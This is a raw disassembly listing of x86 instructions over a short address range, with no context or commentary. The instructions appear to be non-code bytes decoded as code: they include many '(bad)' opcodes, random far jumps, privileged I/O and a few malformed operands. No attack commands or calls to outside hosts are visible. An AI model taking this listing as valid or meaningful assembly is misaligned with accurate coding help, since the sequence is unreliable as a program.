  415e2b:	outs   dx,BYTE PTR ds:[esi]
  415e2c:	in     eax,0xa2
  415e2e:	pop    ebx
  415e2f:	ss cmp eax,0xc827ccf9
  415e35:	or     edi,DWORD PTR ds:0x92b5fc35
  415e3b:	idiv   BYTE PTR [esi]
  415e3d:	xchg   esi,eax
  415e3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e3f:	sbb    eax,0xd7653701
  415e44:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  415e46:	push   eax
  415e47:	xor    ebp,DWORD PTR [edx-0x4aa2f124]
  415e4d:	add    al,0x29
  415e4f:	add    eax,0xbdd22a62
  415e54:	sbb    al,0x38
  415e56:	dec    eax
  415e57:	js     0x415ecc
  415e59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e5a:	push   0x2fc4d581
  415e5f:	rcl    ecx,cl
  415e61:	(bad)  
  415e62:	push   ss
  415e63:	adc    edx,ebp
  415e65:	in     eax,dx
  415e66:	(bad)  [ebp+0x26]
  415e69:	call   0xe1c499d8
  415e6e:	jg     0x415e24
  415e70:	and    eax,0xba571d67
  415e75:	mov    ebp,DWORD PTR [edi]
  415e77:	sbb    eax,0xddf0d16f
  415e7c:	mov    eax,ds:0xc5f8d3a6
  415e81:	test   DWORD PTR [edx],esi
  415e83:	push   ss
  415e84:	ins    DWORD PTR es:[edi],dx
  415e85:	aam    0xf3
  415e87:	gs sbb eax,0xbbe62792
  415e8d:	mov    dl,0x92
  415e8f:	das    
  415e90:	dec    esp
  415e91:	push   ebp
  415e92:	cmp    al,0x34
  415e94:	aaa    
  415e95:	jmp    0x7523c195
  415e9a:	or     dl,BYTE PTR [eax+0x2]
  415e9d:	inc    esp
  415e9e:	jb     0x415f01
  415ea0:	dec    ebx
  415ea1:	xor    al,0x77
  415ea3:	jmp    0xc214:0x4fbd4da6
  415eaa:	mov    bh,0x8b
  415eac:	sub    DWORD PTR [edi-0x2d],edx
  415eaf:	pop    edx
  415eb0:	pop    esp
  415eb1:	mov    ch,0x6
  415eb3:	mov    eax,0xcd68211e
  415eb8:	jg     0x415f11
  415eba:	fsubr  st,st(4)
  415ebc:	in     eax,dx
  415ebd:	add    bh,ah
  415ebf:	push   0x26
  415ec1:	les    esi,FWORD PTR [esi]
  415ec3:	sbb    ch,BYTE PTR [esp+ecx*8-0x2b]
  415ec7:	mov    bl,0xf0
  415ec9:	popa   
  415eca:	test   al,0x8e
  415ecc:	stc    
  415ecd:	add    BYTE PTR [eax+0x3f82784e],0xb
  415ed4:	aas    
  415ed5:	sar    DWORD PTR [eax+0x32],1
  415ed8:	fsub   QWORD PTR [edx-0x2b82298d]
  415ede:	mov    eax,ds:0xef0b3372
  415ee3:	fimul  WORD PTR [edi]
  415ee5:	or     DWORD PTR [ebx+0x6d],ebx
  415ee8:	xchg   edx,eax
  415ee9:	sbb    BYTE PTR [esi],0x0
  415eec:	mov    ecx,0x3e85073e
  415ef1:	and    eax,0x58a4114b
  415ef6:	retf   0x8bda
  415ef9:	sti    
  415efa:	test   al,0xcf
  415efc:	sbb    cl,dl
  415efe:	lahf   
  415eff:	xchg   ebx,eax
  415f00:	pop    ss
  415f01:	xor    DWORD PTR [ebx],ebx
  415f03:	int    0x1
  415f05:	pusha  
  415f06:	stc    
  415f07:	ja     0x415eed
  415f09:	into   
  415f0a:	inc    ebp
  415f0b:	and    eax,0x7574ed06
  415f10:	dec    esi
  415f11:	shl    DWORD PTR [edi],cl
  415f13:	outs   dx,DWORD PTR ds:[esi]
  415f14:	push   0xbcd262c3
  415f19:	sbb    DWORD PTR [edx],esp
  415f1b:	test   al,0x5c
  415f1d:	std    
  415f1e:	arpl   sp,cx
  415f20:	inc    ebp
  415f21:	cmp    DWORD PTR [ecx],edx
  415f23:	rol    edi,0xda
  415f26:	or     eax,0x44ec3107
  415f2b:	pusha  
  415f2c:	fisubr DWORD PTR [edx-0x63fdd87c]
  415f32:	jp     0x415ebe
  415f34:	stos   BYTE PTR es:[edi],al
  415f35:	xor    DWORD PTR ds:0x52a12172,ebp
  415f3b:	or     al,0xa6
  415f3d:	xchg   esi,eax
  415f3e:	lods   al,BYTE PTR ds:[esi]
  415f3f:	sub    DWORD PTR [esi],esp
  415f41:	adc    DWORD PTR [esi],esi
  415f43:	inc    ebp
  415f44:	test   BYTE PTR [edx+0x48],al
  415f47:	mov    esi,0xdb2ede5f
  415f4c:	and    bh,BYTE PTR [esi*1-0xa1ac07d]
  415f53:	addr16 dec edi
  415f55:	idiv   DWORD PTR [edx]
  415f57:	sbb    BYTE PTR [eax+edi*4+0x4b],cl
  415f5b:	lock or al,0x44
  415f5e:	jg     0x415fb0
  415f60:	pop    ebp
  415f61:	je     0x415fae
  415f63:	jno    0x415f1a
  415f65:	imul   ebx,DWORD PTR [edi+0x7a],0xd991552f
  415f6c:	test   eax,ecx
  415f6e:	in     eax,0xa2
  415f70:	cdq    
  415f71:	jg     0x415f87
  415f73:	mov    bl,0xc4
  415f75:	dec    eax
  415f76:	aad    0x83
  415f78:	test   DWORD PTR [esi],ebx
  415f7a:	cmp    BYTE PTR [ecx+0x21b322ce],ch
  415f80:	dec    eax
  415f81:	dec    esp
  415f82:	mov    ch,0xaa
  415f84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f85:	add    ebp,DWORD PTR [edi-0x2c]
  415f88:	push   edi
  415f89:	push   eax
  415f8a:	test   BYTE PTR [edx+edi*8],dh
  415f8d:	cld    
  415f8e:	imul   ebp,DWORD PTR [edi-0x5144bbbf],0x537c3f86
  415f98:	push   ebx
  415f99:	ds dec ecx
  415f9b:	xchg   esi,eax
  415f9c:	xlat   BYTE PTR ds:[ebx]
  415f9d:	scas   al,BYTE PTR es:[edi]
  415f9e:	or     ah,BYTE PTR [ebp+0x53]
  415fa1:	jo     0x416007
  415fa3:	imul   eax,DWORD PTR [ebx+esi*4+0x18e39da1],0xffffffb4
  415fab:	sub    eax,0x54e5f683
  415fb0:	test   BYTE PTR [edi+0xdc8c465],al
  415fb6:	nop
  415fb7:	or     BYTE PTR [eax],bh
  415fb9:	scas   al,BYTE PTR es:[edi]
  415fba:	addr16 push ss
  415fbc:	or     ebp,DWORD PTR [ebp+0x7acdf6f]
  415fc2:	int    0x57
  415fc4:	popa   
  415fc5:	jmp    0xc68edf71
  415fca:	dec    esi
  415fcb:	imul   edx,DWORD PTR [edi-0x48205342],0xffffffc8
  415fd2:	pop    eax
  415fd3:	push   0xb2749f09
  415fd8:	xchg   edi,eax
  415fd9:	ret    
  415fda:	les    esi,FWORD PTR [ecx-0x343f59b1]
  415fe0:	mov    ebp,0x732cd7b
  415fe5:	test   al,0xa7
  415fe7:	mov    ebx,0x90e957b8
  415fec:	sub    DWORD PTR [edi+0x66],esi
  415fef:	push   edi
  415ff0:	mov    eax,ds:0x376f8cb
  415ff5:	push   edi
  415ff6:	(bad)  
  415ff7:	pop    esi
  415ff8:	aam    0xfa
  415ffa:	in     eax,0x2d
  415ffc:	and    al,0xc7
  415ffe:	imul   ebx,DWORD PTR [ecx-0x57832b76],0xa3794fc9
  416008:	push   0x7b0db657
  41600d:	ds inc esi
  41600f:	push   ecx
  416010:	dec    edi
  416011:	dec    ebx
  416012:	jmp    0x73c1:0x1298fe89
  416019:	retf   0xb674
  41601c:	popf   
  41601d:	inc    esi
  41601e:	loope  0x416049
  416020:	mov    bl,0x92
  416022:	or     BYTE PTR [eax+0x7c],dh
  416025:	pop    ecx
  416026:	cld    
  416027:	mov    bh,0x7d
  416029:	test   BYTE PTR ds:0x81c6ec8e,ch
  41602f:	shl    DWORD PTR [ebx+ebp*2+0x27173783],1
  416036:	ror    DWORD PTR [ebx+ecx*1+0x6adbd350],0x6
  41603e:	fninit 
  416040:	pusha  
  416041:	xlat   BYTE PTR ds:[ebx]
  416042:	in     eax,dx
  416043:	push   eax
  416044:	scas   eax,DWORD PTR es:[edi]
  416045:	(bad)  
  416046:	jecxz  0x416044
  416048:	push   edx
  416049:	hlt    
  41604a:	cwde   
  41604b:	aam    0x78
  41604d:	inc    esp
  41604e:	hlt    
  41604f:	mov    ds:0xfbda22d8,al
  416054:	inc    edx
  416055:	mov    DWORD PTR [edx-0x15],ebp
  416058:	push   esp
  416059:	pusha  
  41605a:	sub    dl,BYTE PTR [ebp+0xd4c505]
  416060:	push   esp
  416061:	push   0x1e
  416063:	inc    edx
  416064:	daa    
  416065:	inc    bp
  416067:	std    
  416068:	in     eax,0xe3
  41606a:	int3   
  41606b:	mov    WORD PTR [ebx],cs
  41606d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41606e:	push   cs
  41606f:	test   BYTE PTR ds:0x280d545d,al
  416075:	push   ds
  416076:	fidivr DWORD PTR [esi-0x5d]
  416079:	(bad)  
  41607a:	repnz mov ds:0xb6099cf2,al
  416080:	das    
  416081:	push   es
  416082:	pushf  
  416083:	scas   al,BYTE PTR es:[edi]
  416084:	out    0x2,al
  416086:	or     al,0x83
  416088:	std    
  416089:	or     al,0x98
  41608b:	mov    edi,DWORD PTR [edx+0x23]
  41608e:	add    DWORD PTR [ecx+0x4a],esi
  416091:	(bad)  
  416093:	and    bh,BYTE PTR [edx+0xe921d2f]
  416099:	add    eax,DWORD PTR [edx+ebx*8-0x9a3c7da]
  4160a0:	inc    edx
  4160a1:	dec    ebp
  4160a2:	stos   DWORD PTR es:[edi],eax
  4160a3:	cli    
  4160a4:	xchg   ebp,eax
  4160a5:	pop    eax
  4160a6:	or     ecx,DWORD PTR ds:0xc3051986
  4160ac:	imul   ebx,DWORD PTR [ebx],0x8ebd9eb
  4160b2:	mov    esp,0xd4a79b2b
  4160b7:	repnz das 
  4160b9:	test   BYTE PTR [edx+0x77f9147],0xb8
  4160c0:	lods   eax,DWORD PTR ds:[esi]
  4160c1:	push   cs
  4160c2:	mov    ecx,0x871048f8
  4160c7:	xchg   ebx,eax
  4160c8:	jnp    0x4160bc
  4160ca:	jmp    0x416051
  4160cc:	scas   al,BYTE PTR es:[edi]
  4160cd:	sub    al,0x8
  4160cf:	xor    al,0x6
  4160d1:	inc    ebp
  4160d2:	lock adc DWORD PTR [eax+0x7e],0xfffffffe
  4160d7:	dec    esp
  4160d8:	mov    bh,BYTE PTR [eax-0x27a9190b]
  4160de:	sub    ecx,esi
  4160e0:	jae    0x4160fa
  4160e2:	out    dx,al
  4160e3:	push   edi
  4160e4:	xchg   cl,ah
  4160e6:	pop    ss
  4160e7:	cmp    al,0x9f
  4160e9:	cmc    
  4160ea:	jmp    0xa54b:0x695a87aa
  4160f1:	stos   BYTE PTR es:[edi],al
  4160f2:	popf   
  4160f3:	push   ecx
  4160f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160f5:	push   esi
  4160f6:	mov    dl,0xaf
  4160f8:	add    eax,0x5b56f1af
  4160fd:	cmp    DWORD PTR [edx-0x1849f176],esi
  416103:	adc    BYTE PTR [ebp-0x65d7c727],bh
  416109:	cmp    esi,esp
  41610b:	push   0x5ca10210
  416110:	mov    BYTE PTR [edx-0x37],bl
  416113:	jmp    0xb166:0x5848a471
  41611a:	inc    esp
  41611b:	xlat   BYTE PTR ds:[ebx]
  41611c:	fs repnz inc ebx
  41611f:	or     eax,0xf1c1ca9
  416124:	or     eax,0x21362615
  416129:	adc    BYTE PTR [ecx],dh
  41612b:	mov    eax,ds:0x7b40609
  416130:	xchg   ebp,eax
  416131:	arpl   dx,ax
  416133:	test   eax,0xd7f55c99
  416138:	pop    edx
  416139:	mov    ebx,0x4814a364
  41613e:	in     al,0xcb
  416140:	jmp    0x795e2bda
  416145:	je     0x41616d
  416147:	hlt    
  416148:	sbb    eax,0xe4813e60
  41614d:	xchg   BYTE PTR [edx-0x7c86d84f],al
  416153:	fs clc 
  416155:	shl    DWORD PTR [edx],0x52
  416158:	(bad)  
  41615a:	pop    esp
  41615b:	(bad)  
  41615c:	jae    0x416128
  41615e:	hlt    
  41615f:	push   ds
  416160:	push   esi
  416161:	lahf   
  416162:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416163:	sbb    eax,0x7088d54e
  416168:	adc    ch,BYTE PTR [edi+0x19]
  41616b:	cdq    
  41616c:	xchg   DWORD PTR [edi+ecx*2],ebp
  41616f:	into   
  416170:	push   cs
  416171:	mov    eax,0xbb1aa768
  416176:	add    dl,BYTE PTR [ebx+0x4ca1a870]
  41617c:	push   ss
  41617d:	aas    
  41617e:	mov    al,ds:0x3c443baf
  416183:	sub    eax,0xb1c10566
  416188:	sub    esp,DWORD PTR [eax+0x13]
  41618b:	sahf   
  41618c:	aam    0x72
  41618e:	push   ds
  41618f:	out    dx,al
  416190:	mov    al,ds:0xda1757fd
  416195:	pop    edx
  416196:	mov    al,0x99
  416198:	das    
  416199:	daa    
  41619a:	push   es
  41619b:	fwait
  41619c:	je     0x416198
  41619e:	shr    cl,cl
  4161a0:	outs   dx,BYTE PTR ds:[esi]
  4161a1:	push   eax
  4161a2:	das    
  4161a3:	mov    dh,0xd3
  4161a5:	mov    ds:0xc7b37729,al
  4161aa:	cmc    
  4161ab:	add    edi,DWORD PTR [ebp+0x6204e761]
  4161b1:	cs dec ecx
  4161b3:	add    ecx,DWORD PTR [esi+0x2f]
  4161b6:	pop    esi
  4161b7:	xchg   edx,eax
  4161b8:	jno    0x416166
  4161ba:	push   ebx
  4161bb:	loopne 0x416181
  4161bd:	mov    esp,DWORD PTR [edi]
  4161bf:	stos   DWORD PTR es:[edi],eax
  4161c0:	das    
  4161c1:	popa   
  4161c2:	(bad)  
  4161c3:	in     al,dx
  4161c4:	dec    ebx
  4161c5:	cld    
  4161c6:	(bad)  
  4161c8:	lds    ecx,FWORD PTR [ebx-0x5c7c2423]
  4161ce:	pop    esp
  4161cf:	stos   DWORD PTR es:[edi],eax
  4161d0:	pop    eax
  4161d1:	jmp    0x4161fc
  4161d3:	loopne 0x4161e1
  4161d5:	push   ebx
  4161d6:	idiv   DWORD PTR [ecx+edx*1]
  4161d9:	cdq    
  4161da:	adc    ah,0xb8
  4161dd:	add    al,0xbd
  4161df:	xchg   al,dl
  4161e1:	std    
  4161e2:	or     BYTE PTR [ecx+edi*1+0x8],al
  4161e6:	in     al,0x89
  4161e8:	xor    eax,0xf45273c9
  4161ed:	fild   QWORD PTR [esi]
  4161ef:	pop    ebp
  4161f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161f1:	mov    dl,0x8c
  4161f3:	repz inc edi
  4161f5:	rcr    BYTE PTR [edi+eax*4+0x27],1
  4161f9:	xor    eax,0xc2913082
  4161fe:	stos   BYTE PTR es:[edi],al
  4161ff:	lea    ebx,[ecx+edx*4-0x40040298]
  416206:	and    bl,BYTE PTR [edx]
  416208:	push   cs
  416209:	stc    
  41620a:	pop    esp
  41620b:	(bad)  
  41620c:	scas   eax,DWORD PTR es:[edi]
  41620d:	pop    ebx
  41620e:	test   eax,0x197d8e64
  416213:	jne    0x4161d0
  416215:	mov    dl,0xcf
  416217:	dec    edx
  416218:	sbb    DWORD PTR [edx],esp
  41621a:	mul    DWORD PTR [esi+ebp*8+0x547c3bcb]
  416221:	push   ds
  416222:	adc    DWORD PTR [ebp+0x258a6c93],esi
  416228:	mov    bh,0xbf
  41622a:	add    edx,DWORD PTR [ebp-0x5d]
  41622d:	mov    ds:0xc446456d,eax
  416232:	sbb    ecx,edx
  416234:	ja     0x4161d0
  416236:	fstp   DWORD PTR [ebp+0x858f761]
  41623c:	sub    bl,ah
  41623e:	jb     0x416232
  416240:	repz xor BYTE PTR [edx],cl
  416243:	and    edx,0x3d
  416246:	mov    gs,WORD PTR [ebx+0xe]
  416249:	jge    0x416246
  41624b:	jno    0x41622a
  41624d:	cdq    
  41624e:	retf   0x23b9
  416251:	pop    ebp
  416252:	fnstcw WORD PTR [ebx-0x48b3452]
  416258:	or     ecx,0x6ebd6624
  41625e:	stc    
  41625f:	popf   
  416260:	pop    edx
  416261:	xchg   ecx,eax
  416262:	or     esp,DWORD PTR [ebx-0x6b]
  416265:	push   ecx
  416266:	push   cs
  416267:	dec    ebx
  416268:	icebp  
  416269:	clc    
  41626a:	ja     0x416237
  41626c:	int3   
  41626d:	pop    ss
  41626e:	test   BYTE PTR [edx-0x3b6ad27],cl
  416274:	adc    edx,DWORD PTR [eax+eiz*1]
  416277:	pusha  
  416278:	xor    al,0xed
  41627a:	push   es
  41627b:	je     0x4161fe
  41627d:	std    
  41627e:	jae    0x41620b
  416280:	imul   edx,DWORD PTR [edi],0xffffffe4
  416283:	xlat   BYTE PTR ds:[ebx]
  416284:	clc    
  416285:	dec    esi
  416286:	dec    eax
  416287:	in     al,dx
  416288:	sub    esi,DWORD PTR [esi+0x66]
  41628b:	shl    DWORD PTR [ecx],1
  41628d:	sub    ch,cl
  41628f:	or     eax,ebx
  416291:	mov    esi,0x57b6ea60
  416296:	sbb    DWORD PTR [ebx],ebx
  416298:	jmp    0x20e0:0x3f35c9c0
  41629f:	adc    DWORD PTR [edx+0x4c],esi
  4162a2:	xor    DWORD PTR [edi+esi*2+0x5f6f3724],0xb699b174
  4162ad:	bnd je 0x416239
  4162b0:	mov    bl,0x71
  4162b2:	mov    esi,0x23df0264
  4162b7:	sub    eax,DWORD PTR [eax-0x60]
  4162ba:	gs sti 
  4162bc:	mov    dh,BYTE PTR [edx+edi*1-0x7d]
  4162c0:	mov    ch,0x1b
  4162c2:	jge    0x416251
  4162c4:	mov    cl,0xaf
  4162c6:	mov    dl,0x6b
  4162c8:	adc    DWORD PTR [eax],eax
  4162ca:	mov    dl,0x5b
  4162cc:	jg     0x41626a
  4162ce:	fwait
  4162cf:	out    0x92,al
  4162d1:	jge    0x4162ce
  4162d3:	mul    DWORD PTR [edx+esi*8]
  4162d6:	mov    bl,0xe2
  4162d8:	and    al,0xf5
  4162da:	mov    bl,0x6e
  4162dc:	mov    edx,0x618081b8
  4162e1:	sbb    eax,0x38d627c9
  4162e6:	stos   DWORD PTR es:[edi],eax
  4162e7:	xor    al,dl
  4162e9:	add    eax,0x727f0a88
  4162ee:	and    edx,DWORD PTR [esi]
  4162f0:	ins    DWORD PTR es:[edi],dx
  4162f1:	adc    edi,edx
  4162f3:	ret    0x75a6
  4162f6:	sti    
  4162f7:	push   ss
  4162f8:	mov    es,ecx
  4162fa:	xchg   esi,ebx
  4162fc:	pop    ebx
  4162fd:	sahf   
  4162fe:	pop    edx
  4162ff:	mov    WORD PTR [esi+ebp*4],?
  416302:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416303:	xchg   ebx,eax
  416304:	xor    DWORD PTR [eax+esi*8],ebx
  416307:	(bad)  
  416308:	sub    ebx,DWORD PTR [edx+0x6af72067]
  41630e:	(bad)  
  41630f:	es es dec ebx
  416312:	int    0x65
  416314:	sub    BYTE PTR [ecx],0x24
  416317:	neg    DWORD PTR [ecx+0x11de6857]
  41631d:	sbb    DWORD PTR [esi+0x28664d7f],0x29
  416324:	and    al,0x2c
  416326:	inc    ecx
  416327:	xchg   ecx,eax
  416328:	stos   DWORD PTR es:[edi],eax
  416329:	inc    ecx
  41632a:	push   DWORD PTR [esi]
  41632c:	cdq    
  41632d:	dec    ebx
  41632e:	retf   0x42b6
  416331:	push   ss
  416332:	ror    DWORD PTR [edx-0x14],cl
  416335:	jmp    0x4162d7
  416337:	pop    ds
  416338:	fisttp WORD PTR [edx+esi*1]
  41633b:	mov    edx,0x67b3c2a4
  416340:	sub    DWORD PTR [esi],edx
  416342:	push   cs
  416343:	inc    ecx
  416344:	sbb    DWORD PTR [edx-0x5],esi
  416347:	inc    edi
  416348:	sar    ch,cl
  41634a:	dec    esp
  41634b:	jge    0x416348
  41634d:	into   
  41634e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41634f:	repz addr16 jg 0x4163a4
  416353:	inc    BYTE PTR [edx+0x68]
  416356:	repz xchg bh,cl
  416359:	adc    eax,0x264d1b87
  41635e:	or     eax,0x598d0eea
  416363:	ins    DWORD PTR es:[edi],dx
  416364:	lock jbe 0x416380
  416367:	mov    bl,0x6d
  416369:	ror    DWORD PTR [esi-0x6f],0x0
  41636d:	(bad)
  416370:	mov    ecx,0xb255bc5
  416375:	fsubr  DWORD PTR [edi-0x1ec5574c]
  41637b:	cld    
  41637c:	push   ds
  41637d:	adc    DWORD PTR [edx],esi
  41637f:	cli    
  416380:	xor    eax,0x9518ee4a
  416385:	sbb    eax,ebp
  416387:	imul   ebx,DWORD PTR [ebp+0x60],0x29
  41638b:	dec    ecx
  41638c:	shl    BYTE PTR [edi+0x2d],cl
  41638f:	pop    ecx
  416390:	sbb    al,0x76
  416392:	jns    0x416388
  416394:	popf   
  416395:	(bad)  
  416396:	push   ds
  416397:	and    BYTE PTR ds:0xefa1929b,bl
  41639d:	mov    ebp,0x7c0821a1
  4163a2:	xlat   BYTE PTR ds:[ebx]
  4163a3:	test   DWORD PTR [ecx-0xbbf817a],0xa672d548
  4163ad:	aam    0xc2
  4163af:	(bad)  
  4163b0:	jge    0x416403
  4163b2:	mov    cl,0xca
  4163b4:	and    DWORD PTR [ebx-0x477c3c8c],edi
  4163ba:	dec    edx
  4163bb:	imul   ebx,DWORD PTR [ecx],0x53
  4163be:	push   0x12
  4163c0:	nop
  4163c1:	xchg   ebp,eax
  4163c2:	arpl   WORD PTR [edx-0x1080d9f7],dx
  4163c8:	jp     0x4163e6
  4163ca:	aam    0x13
  4163cc:	cmp    ebx,DWORD PTR [edi+0x197bbdca]
  4163d2:	mov    edi,0xaf8c0cc4
  4163d7:	adc    eax,0x2bbcccd2
  4163dc:	ror    BYTE PTR [edi-0x1d40e95],cl
  4163e2:	pop    esp
  4163e3:	out    dx,al
  4163e4:	ficom  DWORD PTR ds:0x6b523042
  4163ea:	and    al,0x8a
  4163ec:	push   0x5f0f2774
  4163f1:	pop    ebx
  4163f2:	lods   eax,DWORD PTR ds:[esi]
  4163f3:	es xor al,0x76
  4163f6:	cmp    edi,DWORD PTR [ecx+0x13ac93ca]
  4163fc:	int    0x91
  4163fe:	adc    DWORD PTR [ebp+0x69],0xffffffd3
  416402:	jns    0x4163d0
  416404:	jp     0x416453
  416406:	add    DWORD PTR [ecx-0x6f],ecx
  416409:	imul   ebx,DWORD PTR fs:[ebp-0x69],0xe2ffb297
  416411:	out    0x73,eax
  416413:	icebp  
  416414:	adc    edx,DWORD PTR [edi+ebx*1]
  416417:	les    esi,FWORD PTR [edx]
  416419:	mov    esi,ecx
  41641b:	int3   
  41641c:	mov    eax,0x88b567c2
  416421:	pop    eax
  416422:	mov    esp,0x5d3a585d
  416427:	fwait
  416428:	and    ch,dh
  41642a:	inc    ecx
  41642b:	das    
  41642c:	aas    
  41642d:	test   ecx,ecx
  41642f:	test   eax,0x799f3500
  416434:	cmp    ch,BYTE PTR [edx-0x5af1ff4c]
  41643a:	sbb    eax,DWORD PTR [ebp+edi*1-0x7c]
  41643e:	mov    esp,DWORD PTR [ecx+0x48]
  416441:	xor    eax,0x68de00c7
  416446:	loope  0x416441
  416448:	pop    esi
  416449:	sub    eax,0x6c671e13
  41644e:	jbe    0x4163db
  416450:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416451:	retf   0x2157
  416454:	pop    ebx
  416455:	adc    esi,ebx
  416457:	pop    edx
  416458:	jecxz  0x4163e7
  41645a:	aam    0x47
  41645c:	mov    ecx,0xffbb7350
  416461:	call   0xea12a723
  416466:	xor    eax,0xe39e5dbf
  41646b:	ins    BYTE PTR es:[edi],dx
  41646c:	shl    BYTE PTR [eax],0x18
  41646f:	nop
  416470:	push   0x220f36cf
  416475:	popa   
  416476:	mov    edx,0x21756341
  41647b:	sti    
  41647c:	out    0xc1,al
  41647e:	fisttp WORD PTR [edx+0x27887325]
  416484:	pop    edi
  416485:	bound  ebx,QWORD PTR es:[edi-0x2c]
  416489:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41648a:	das    
  41648b:	or     DWORD PTR [eax],edx
  41648d:	aas    
  41648e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41648f:	or     esi,DWORD PTR [esi+0x590b532c]
  416495:	call   0x2b51:0x1c7ca35b
  41649c:	pop    ebp
  41649d:	bound  ebp,QWORD PTR [edx]
  41649f:	(bad)  
  4164a0:	fdivr  st(1),st
  4164a2:	in     al,0xff
  4164a4:	cld    
  4164a5:	cs aad 0xca
  4164a8:	test   al,0xac
  4164aa:	pop    ss
  4164ab:	pushf  
  4164ac:	aaa    
  4164ad:	ret    0x833d
  4164b0:	(bad)  
  4164b1:	frndint 
  4164b3:	(bad)  
  4164b4:	dec    edi
  4164b5:	stc    
  4164b6:	pop    ebx
  4164b7:	jne    0x416498
  4164b9:	das    
  4164ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164bb:	inc    ebx
  4164bc:	pop    ss
  4164bd:	dec    edi
  4164be:	jle    0x41645b
  4164c0:	dec    esp
  4164c1:	mov    al,0x1d
  4164c3:	(bad)  
  4164c4:	inc    DWORD PTR [esi+edi*1]
  4164c7:	ret    0xf0c4
  4164ca:	mov    edx,?
  4164cc:	add    eax,DWORD PTR [esi]
  4164ce:	rcr    DWORD PTR [edx-0x4763df64],1
  4164d4:	mov    ecx,db5
  4164d7:	cli    
  4164d8:	inc    ebx
  4164d9:	xor    BYTE PTR [di+0x61c0],bh
  4164de:	(bad)  [eax+0x6f12f2c0]
  4164e4:	stc    
  4164e5:	aad    0x58
  4164e7:	add    al,0x32
  4164e9:	in     eax,dx
  4164ea:	push   esi
  4164eb:	push   ebx
  4164ec:	mov    dl,0x18
  4164ee:	push   ebx
  4164ef:	sub    dl,BYTE PTR [esi]
  4164f1:	adc    DWORD PTR [edi],ecx
  4164f3:	arpl   ax,ax
  4164f5:	adc    ecx,esp
  4164f7:	ins    DWORD PTR es:[edi],dx
  4164f8:	and    al,0x60
  4164fa:	push   0x289ec544
  4164ff:	mov    bh,0x9b
  416501:	pop    ebp
  416502:	sbb    BYTE PTR [ebp+0x58d71122],cl
  416508:	mov    bl,0xa7
  41650a:	cmp    ch,BYTE PTR [esi]
  41650c:	xor    DWORD PTR [ecx+0x44ca3c5a],0x647858e4
  416516:	sbb    al,0x5b
  416518:	gs inc edx
  41651a:	outs   dx,BYTE PTR ds:[esi]
  41651b:	sbb    al,0x19
  41651d:	or     edi,DWORD PTR [esi]
  41651f:	xlat   BYTE PTR ds:[ebx]
  416520:	xor    eax,0x14ffa09f
  416525:	jae    0x416551
  416527:	xor    esi,eax
  416529:	jno    0x4164e4
  41652b:	xchg   ecx,eax
  41652c:	fbld   TBYTE PTR [eax]
  41652e:	retw   0x957
  416532:	push   esp
  416533:	cmp    DWORD PTR [esp+ecx*1],ecx
  416536:	jo     0x416518
  416538:	jp     0x4164e2
  41653a:	sbb    BYTE PTR [ebx+0x4a3fded2],al
  416540:	sub    al,0x84
  416542:	add    dl,BYTE PTR [edx]
  416544:	sub    dh,dh
  416546:	cmp    al,0x51
  416548:	jb     0x4165c3
  41654a:	out    dx,eax
  41654b:	out    dx,eax
  41654c:	mov    bl,BYTE PTR [eax]
  41654e:	(bad)  
  416550:	mul    DWORD PTR [eax]
  416552:	in     eax,dx
  416553:	iret   
  416554:	jno    0x4165b1
  416556:	pop    ds
  416557:	mov    ch,0xc3
  416559:	push   eax
  41655a:	stos   BYTE PTR es:[edi],al
  41655b:	aad    0x67
  41655d:	scas   eax,DWORD PTR es:[edi]
  41655e:	jb     0x4164eb
  416560:	mov    ch,0x31
  416562:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416563:	(bad)
  416566:	jae    0x4165da
  416568:	sub    eax,0x4131988f
  41656d:	fst    st(1)
  41656f:	mov    al,ds:0x6725fdf4
  416574:	inc    ebp
  416575:	inc    ebx
  416576:	jo     0x416567
  416578:	clc    
  416579:	cwde   
  41657a:	leave  
  41657b:	lahf   
  41657c:	xor    al,0xc4
  41657e:	or     eax,0xb8297c1d
  416583:	and    BYTE PTR [edi+0x1197d596],0x96
  41658a:	repz enter 0xc329,0x92
  41658f:	push   ss
  416590:	lods   eax,DWORD PTR ds:[esi]
  416591:	jns    0x416566
  416593:	retf   
  416594:	push   eax
  416595:	mov    edi,0xbf99191b
  41659a:	loop   0x41660e
  41659c:	mov    cl,BYTE PTR [ebp+0x4332ac78]
  4165a2:	(bad)  
  4165a3:	call   0x6b6df4de
  4165a8:	xor    al,0x9d
  4165aa:	mov    edi,0xae621603
  4165af:	xor    ebp,DWORD PTR [ecx-0x7b]
  4165b2:	test   DWORD PTR [ebp-0x35e3577e],edi
  4165b8:	test   BYTE PTR [ecx-0x3e3eed65],al
  4165be:	adc    ebp,DWORD PTR [ebx+0x644da9ae]
  4165c4:	pop    ebp
  4165c5:	push   es
  4165c6:	adc    dl,bl
  4165c8:	mov    ebx,0x825081df
  4165cd:	cs retf 
  4165cf:	mov    ah,0xc8
  4165d1:	adc    eax,0x1a1a266f
  4165d6:	cmp    DWORD PTR [esi],ebp
  4165d8:	nop
  4165d9:	les    edx,FWORD PTR [edi+0xcef4c23]
  4165df:	mov    bl,0xcd
  4165e1:	call   0xdd3165e4
  4165e6:	rol    BYTE PTR [esi],0x84
  4165e9:	push   cs
  4165ea:	stc    
  4165eb:	add    DWORD PTR [ecx+0x23],eax
  4165ee:	and    al,0x77
  4165f0:	xor    eax,0xae23ee17
  4165f5:	je     0x41659d
  4165f7:	jp     0x4165e7
  4165f9:	popf   
  4165fa:	mov    ds:0x41af1a1e,al
  4165ff:	push   edx
  416600:	cwde   
  416601:	sbb    al,0x37
  416603:	hlt    
  416604:	in     eax,dx
  416605:	and    dh,BYTE PTR es:[edx]
  416608:	jae    0x416676
  41660a:	inc    edx
